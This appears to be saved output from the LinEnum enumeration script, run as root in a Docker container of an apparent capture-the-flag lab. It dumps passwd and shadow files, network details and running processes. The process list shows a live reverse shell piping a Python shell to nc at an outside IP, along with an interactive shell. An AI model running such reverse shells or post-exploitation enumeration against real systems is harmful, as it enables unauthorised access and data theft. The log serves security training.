@@ -1,0 +1,321 @@
+
+#########################################################
+# Local Linux Enumeration & Privilege Escalation Script #
+#########################################################
+# www.rebootuser.com
+# version 0.95
+
+[-] Debug Info
+[+] Thorough tests = Disabled
+
+
+Scan started at:
+Fri Sep 27 10:49:27 UTC 2019
+
+
+### SYSTEM ##############################################
+[-] Kernel information:
+Linux 5a3d243127f5 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 Linux
+
+
+[-] Kernel information (continued):
+Linux version 4.9.0-8-amd64 (debian-kernel@lists.debian.org) (gcc version 6.3.0 20170516 (Debian 6.3.0-18+deb9u1) ) #1 SMP Debian 4.9.130-2 (2018-10-27)
+
+
+[-] Specific release information:
+3.9.0
+NAME="Alpine Linux"
+ID=alpine
+VERSION_ID=3.9.0
+PRETTY_NAME="Alpine Linux v3.9"
+HOME_URL="https://alpinelinux.org/"
+BUG_REPORT_URL="https://bugs.alpinelinux.org/"
+
+
+[-] Hostname:
+5a3d243127f5
+
+
+### USER/GROUP ##########################################
+[-] Current user/group info:
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+
+
+[-] Group memberships:
+uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+uid=1(bin) gid=1(bin) groups=1(bin),1(bin),2(daemon),3(sys)
+uid=2(daemon) gid=2(daemon) groups=2(daemon),1(bin),2(daemon),4(adm)
+uid=3(adm) gid=4(adm) groups=4(adm),3(sys),4(adm),6(disk)
+uid=4(lp) gid=7(lp) groups=7(lp),7(lp)
+uid=5(sync) gid=0(root) groups=0(root)
+uid=6(shutdown) gid=0(root) groups=0(root)
+uid=7(halt) gid=0(root) groups=0(root)
+uid=8(mail) gid=12(mail) groups=12(mail),12(mail)
+uid=9(news) gid=13(news) groups=13(news),13(news)
+uid=10(uucp) gid=14(uucp) groups=14(uucp),14(uucp)
+uid=11(operator) gid=0(root) groups=0(root)
+uid=13(man) gid=15(man) groups=15(man),15(man)
+uid=14(postmaster) gid=12(mail) groups=12(mail)
+uid=16(cron) gid=16(cron) groups=16(cron),16(cron)
+uid=21(ftp) gid=21(ftp) groups=21(ftp)
+uid=22(sshd) gid=22(sshd) groups=22(sshd)
+uid=25(at) gid=25(at) groups=25(at),25(at)
+uid=31(squid) gid=31(squid) groups=31(squid),31(squid)
+uid=33(xfs) gid=33(xfs) groups=33(xfs),33(xfs)
+uid=35(games) gid=35(games) groups=35(games),100(users)
+uid=70(postgres) gid=70(postgres) groups=70(postgres)
+uid=85(cyrus) gid=12(mail) groups=12(mail)
+uid=89(vpopmail) gid=89(vpopmail) groups=89(vpopmail)
+uid=123(ntp) gid=123(ntp) groups=123(ntp)
+uid=209(smmsp) gid=209(smmsp) groups=209(smmsp),209(smmsp)
+uid=405(guest) gid=100(users) groups=100(users)
+uid=65534(nobody) gid=65534(nobody) groups=65534(nobody)
+
+
+sh: gid=0(root): unknown operand
+[-] Contents of /etc/passwd:
+root:x:0:0:root:/root:/bin/ash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+news:x:9:13:news:/usr/lib/news:/sbin/nologin
+uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
+operator:x:11:0:operator:/root:/bin/sh
+man:x:13:15:man:/usr/man:/sbin/nologin
+postmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologin
+cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
+ftp:x:21:21::/var/lib/ftp:/sbin/nologin
+sshd:x:22:22:sshd:/dev/null:/sbin/nologin
+at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
+squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
+xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
+games:x:35:35:games:/usr/games:/sbin/nologin
+postgres:x:70:70::/var/lib/postgresql:/bin/sh
+cyrus:x:85:12::/usr/cyrus:/sbin/nologin
+vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
+ntp:x:123:123:NTP:/var/empty:/sbin/nologin
+smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
+guest:x:405:100:guest:/dev/null:/sbin/nologin
+nobody:x:65534:65534:nobody:/:/sbin/nologin
+
+
+[+] We can read the shadow file!
+root:::0:::::
+bin:!::0:::::
+daemon:!::0:::::
+adm:!::0:::::
+lp:!::0:::::
+sync:!::0:::::
+shutdown:!::0:::::
+halt:!::0:::::
+mail:!::0:::::
+news:!::0:::::
+uucp:!::0:::::
+operator:!::0:::::
+man:!::0:::::
+postmaster:!::0:::::
+cron:!::0:::::
+ftp:!::0:::::
+sshd:!::0:::::
+at:!::0:::::
+squid:!::0:::::
+xfs:!::0:::::
+games:!::0:::::
+postgres:!::0:::::
+cyrus:!::0:::::
+vpopmail:!::0:::::
+ntp:!::0:::::
+smmsp:!::0:::::
+guest:!::0:::::
+nobody:!::0:::::
+
+
+[-] Super user account(s):
+root
+
+
+[+] We can read root's home directory!
+total 12
+drwx------    1 root     root        4.0K Feb  9  2019 .
+drwxr-xr-x    1 root     root        4.0K Feb 10  2019 ..
+drwx------    1 root     root        4.0K Feb  9  2019 .cache
+
+
+[-] Are permissions on /home directories lax:
+total 8
+drwxr-xr-x    2 root     root        4.0K Jan 30  2019 .
+drwxr-xr-x    1 root     root        4.0K Feb 10  2019 ..
+
+
+### ENVIRONMENTAL #######################################
+[-] Environment information:
+HOSTNAME=5a3d243127f5
+PYTHON_PIP_VERSION=19.0.1
+SHLVL=3
+HOME=/root
+OLDPWD=/opt/app
+GPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421D
+PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+LANG=C.UTF-8
+PYTHON_VERSION=3.6.8
+PWD=/tmp
+
+
+[-] Path information:
+/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+
+[-] Available shells:
+# valid login shells
+/bin/sh
+/bin/ash
+
+
+[-] Current umask value:
+0022
+u=rwx,g=rx,o=rx
+
+
+### JOBS/TASKS ##########################################
+[-] Cron jobs:
+total 12
+drwxr-xr-x    2 root     root          4096 Jan 30  2019 .
+drwxr-xr-x    1 root     root          4096 Feb 10  2019 ..
+-rw-------    1 root     root           283 Jan 23  2019 root
+
+
+[-] Anything interesting in /var/spool/cron/crontabs:
+lrwxrwxrwx    1 root     root            13 Jan 30  2019 /var/spool/cron/crontabs -> /etc/crontabs
+
+
+[-] Jobs held by all users:
+# do daily/weekly/monthly maintenance
+# min	hour	day	month	weekday	command
+*/15	*	*	*	*	run-parts /etc/periodic/15min
+0	*	*	*	*	run-parts /etc/periodic/hourly
+0	2	*	*	*	run-parts /etc/periodic/daily
+0	3	*	*	6	run-parts /etc/periodic/weekly
+0	5	1	*	*	run-parts /etc/periodic/monthly
+
+
+### NETWORKING  ##########################################
+[-] Network and IP info:
+eth0      Link encap:Ethernet  HWaddr 02:42:AC:14:00:06  
+          inet addr:172.20.0.6  Bcast:172.20.255.255  Mask:255.255.0.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:3907 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:4118 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:923638 (901.9 KiB)  TX bytes:630611 (615.8 KiB)
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          UP LOOPBACK RUNNING  MTU:65536  Metric:1
+          RX packets:14 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:14 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1 
+          RX bytes:780 (780.0 B)  TX bytes:780 (780.0 B)
+
+
+[-] ARP history:
+craft_proxy_1.craft_default (172.20.0.7) at 02:42:ac:14:00:07 [ether]  on eth0
+? (172.20.0.1) at 02:42:58:da:2b:54 [ether]  on eth0
+craft_db_1.craft_default (172.20.0.4) at 02:42:ac:14:00:04 [ether]  on eth0
+
+
+[-] Nameserver(s):
+nameserver 127.0.0.11
+
+
+[-] Default route:
+default         172.20.0.1      0.0.0.0         UG    0      0        0 eth0
+
+
+[-] Listening TCP:
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 0.0.0.0:8888            0.0.0.0:*               LISTEN      1/python
+tcp        0      0 127.0.0.11:36879        0.0.0.0:*               LISTEN      -
+tcp        0    111 172.20.0.6:35246        10.10.14.5:7000         ESTABLISHED 655/python
+tcp        1      0 172.20.0.6:8888         172.20.0.7:43516        CLOSE_WAIT  1/python
+tcp        0      0 172.20.0.6:42590        172.20.0.4:3306         ESTABLISHED 1/python
+
+
+[-] Listening UDP:
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+udp        0      0 127.0.0.11:53355        0.0.0.0:*                           -
+udp        0      0 172.20.0.6:42372        10.66.7.1:53            ESTABLISHED -
+
+
+### SERVICES #############################################
+[-] Running processes:
+PID   USER     TIME  COMMAND
+    1 root      0:04 python ./app.py
+  654 root      0:00 sh -c python shell.py | nc 10.10.14.5 6868
+  655 root      0:00 python shell.py
+  657 root      0:00 /bin/sh -i
+  692 root      0:00 sh LinEnum.sh
+  693 root      0:00 sh LinEnum.sh
+  694 root      0:00 tee -a
+  774 root      0:00 [sh]
+  834 root      0:00 ps aux
+
+
+[-] /etc/init.d/ binary permissions:
+total 8
+drwxr-xr-x    2 root     root          4096 Jan 30  2019 .
+drwxr-xr-x    1 root     root          4096 Feb 10  2019 ..
+
+
+### SOFTWARE #############################################
+### INTERESTING FILES ####################################
+[-] Useful file locations:
+/usr/bin/nc
+/usr/bin/wget
+/usr/bin/gcc
+
+
+[-] Can we read/write sensitive files:
+-rw-r--r--    1 root     root          1224 Jan 23  2019 /etc/passwd
+-rw-r--r--    1 root     root           697 Jan 23  2019 /etc/group
+-rw-r--r--    1 root     root           259 Jan 23  2019 /etc/profile
+-rw-r-----    1 root     shadow         440 Jan 23  2019 /etc/shadow
+
+
+[-] Can't search *.conf files as no keyword was entered
+
+[-] Can't search *.php files as no keyword was entered
+
+[-] Can't search *.log files as no keyword was entered
+
+[-] Can't search *.ini files as no keyword was entered
+
+[-] All *.conf files in /etc (recursive 1 level):
+-rw-r--r--    1 root     root          4169 Jan 24  2019 /etc/udhcpd.conf
+-rw-r--r--    1 root     root            53 Jan 23  2019 /etc/sysctl.conf
+-rw-r--r--    1 root     root            54 Sep 27 08:02 /etc/resolv.conf
+-rw-r--r--    1 root     root           450 Nov 21  2018 /etc/krb5.conf
+-rw-r--r--    1 root     root          6285 Jan 29  2019 /etc/ca-certificates.conf
+
+
+[+] Looks like we're in a Docker container:
+10:cpu,cpuacct:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c
+9:perf_event:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c
+8:devices:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c
+7:cpuset:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c
+6:net_cls,net_prio:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c
+5:freezer:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c
+4:blkio:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c
+3:pids:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c
+2:memory:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c
+1:name=systemd:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c
+-rwxr-xr-x    1 root     root             0 Feb 10  2019 /.dockerenv
+
+
+### SCAN COMPLETE ####################################
